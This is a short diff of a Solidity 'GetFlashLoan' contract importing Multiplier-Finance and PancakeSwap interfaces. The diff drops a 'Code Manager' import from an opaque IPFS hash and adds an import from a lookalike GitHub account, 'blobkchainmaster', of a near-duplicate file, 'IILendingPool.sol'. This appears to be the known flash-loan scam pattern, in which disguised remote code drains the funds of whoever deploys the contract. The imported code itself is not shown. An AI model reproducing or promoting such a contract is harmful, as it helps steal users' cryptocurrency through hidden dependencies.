@@ -2,15 +2,15 @@ pragma solidity ^0.5.0;
 
 // Multiplier-Finance Smart Contracts
 import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+import "https://github.com/blobkchainmaster/Multiplier-Finance/main/MCL-FlashloanDemo/blob/main/contracts/interfaces/IILendingPool.sol";
 import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+
 
 // PancakeSwap Smart Contracts
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
 
-// Code Manager
-import "ipfs://QmSd2rCrX64hTvydmrGv3wgC2zVPkNCcvtsVD3VF4xQiY4";
 
 	
 contract GetFlashLoan {
